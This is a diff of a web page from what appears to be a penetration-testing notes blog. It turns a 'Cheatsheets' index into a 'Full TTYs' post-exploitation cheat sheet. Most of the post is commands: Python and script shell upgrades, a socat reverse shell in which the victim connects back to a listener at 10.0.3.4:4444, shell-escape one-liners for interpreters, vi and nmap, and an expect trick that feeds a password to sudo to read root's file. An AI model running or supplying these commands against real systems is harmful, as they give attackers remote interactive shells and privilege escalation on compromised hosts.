@@ -13,7 +13,7 @@
   
   <title>
     
-      Cheatsheets 
+      Full TTYs 
       
       
       |
@@ -162,24 +162,39 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">Cheatsheets</div>
+      <div class="post-title">Full TTYs</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-03-17 13:11:14
+          2024-03-17 13:15:27
         </span>
         
       </div>
       <div class="markdown-body">
-        <p><a href="../shells">Shells</a></p>
-<h3 id="Active-Directory-Methodology"><a href="#Active-Directory-Methodology" class="headerlink" title="Active Directory Methodology"></a>Active Directory Methodology</h3><p>[ASREPRoast]<br>[Bloodhound]<br>[DCSync]<br>[Kerberoast]<br>[Pass The Ticket (PTT)]<br>[Password Spraying]<br>[Silver Ticket]</p>
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p><a href="../linux-persistence">Linux Persistence</a><br><a href="../linux-priv-esc">Linux Privilege Escalation</a></p>
-<h3 id="Pentesting-Network"><a href="#Pentesting-Network" class="headerlink" title="Pentesting Network"></a>Pentesting Network</h3><p>[Pentesting SMB (139, 445)]<br><a href="../pentesting-ldap">Pentesting LDAP (389, 636, 3268, 3269)</a><br>[Pentesting MSSQL (1433)]</p>
-<h3 id="Pentesting-Web"><a href="#Pentesting-Web" class="headerlink" title="Pentesting Web"></a>Pentesting Web</h3><h3 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a>Programming</h3><p>[Bash]<br><a href="../powershell">Powershell</a></p>
-<h3 id="Protocols"><a href="#Protocols" class="headerlink" title="Protocols"></a>Protocols</h3><p>[HTTP]<br>[SMTP]<br>[SNMP]<br>[POP3]</p>
-<h3 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h3><p>[File Transfers]<br><a href="../full-ttys">Full TTYs</a><br>[Tunneling and Port Forwarding]</p>
-<h3 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h3><p>[Cross-site Request Forgery (CSRF)]<br>[Cross-site Scripting (XSS)]<br>[SQL Injection]</p>
-<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><a href="../windows-credentials">Windows Credentials</a><br><a href="../windows-firewall/">Windows Firewall</a><br><a href="../windows-persistence">Windows Persistence</a><br><a href="../windows-priv-esc">Windows Privilege Escalation</a></p>
+        <h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Within NC session</span></span><br><span class="line">CTRL+Z</span><br><span class="line">stty -a <span class="comment"># Note rows and cols</span></span><br><span class="line">stty raw -echo; fg</span><br><span class="line">ls</span><br><span class="line">export SHELL=/<span class="built_in">bin</span>/bash</span><br><span class="line">export TERM=screen</span><br><span class="line">stty rows &lt;rows&gt; cols &lt;cols&gt;</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+<h1 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -qc /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h1 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Listener</span></span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Victim</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
+
+<h1 id="Spawn-shells"><a href="#Spawn-shells" class="headerlink" title="Spawn shells"></a>Spawn shells</h1><ul>
+<li><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
+<li><code>echo os.system(&#39;/bin/bash&#39;)</code></li>
+<li><code>/bin/sh -i</code></li>
+<li><code>script -qc /bin/bash /dev/null</code></li>
+<li><code>perl -e &#39;exec &quot;/bin/sh&quot;;&#39;</code></li>
+<li>perl: <code>exec &quot;/bin/sh&quot;;</code></li>
+<li>ruby: <code>exec &quot;/bin/sh&quot;</code></li>
+<li>lua: <code>os.execute(&#39;/bin/sh&#39;)</code></li>
+<li>IRB: <code>exec &quot;/bin/sh&quot;</code></li>
+<li>vi: <code>:!bash</code></li>
+<li>vi: <code>:set shell=/bin/bash:shell</code></li>
+<li>nmap: <code>!sh</code></li>
+</ul>
+<h1 id="No-TTY-No-Problem"><a href="#No-TTY-No-Problem" class="headerlink" title="No TTY, No Problem"></a>No TTY, No Problem</h1><p>If for some reason you cannot obtain a full TTY you <strong>still can interact with programs</strong> that expect user input. In the following example, the password is passed to <code>sudo</code> to read a file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expect -c <span class="string">&#x27;spawn sudo -S cat &quot;/root/root.txt&quot;;expect &quot;*password*&quot;;send &quot;&lt;THE_PASSWORD_OF_THE_USER&gt;&quot;;send &quot;\r\n&quot;;interact&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
 
       </div>
       
@@ -190,7 +205,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-03-17 13:11:14
+              2024-03-17 13:15:27
             </span>
             
           </div>
@@ -208,7 +223,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-Directory-Methodology"><span class="toc-text">Active Directory Methodology</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pentesting-Network"><span class="toc-text">Pentesting Network</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pentesting-Web"><span class="toc-text">Pentesting Web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Programming"><span class="toc-text">Programming</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Protocols"><span class="toc-text">Protocols</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tricks"><span class="toc-text">Tricks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Exploitation"><span class="toc-text">Web Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Script"><span class="toc-text">Script</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Socat"><span class="toc-text">Socat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spawn-shells"><span class="toc-text">Spawn shells</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#No-TTY-No-Problem"><span class="toc-text">No TTY, No Problem</span></a></li></ol>
       
     </div>
   </div>
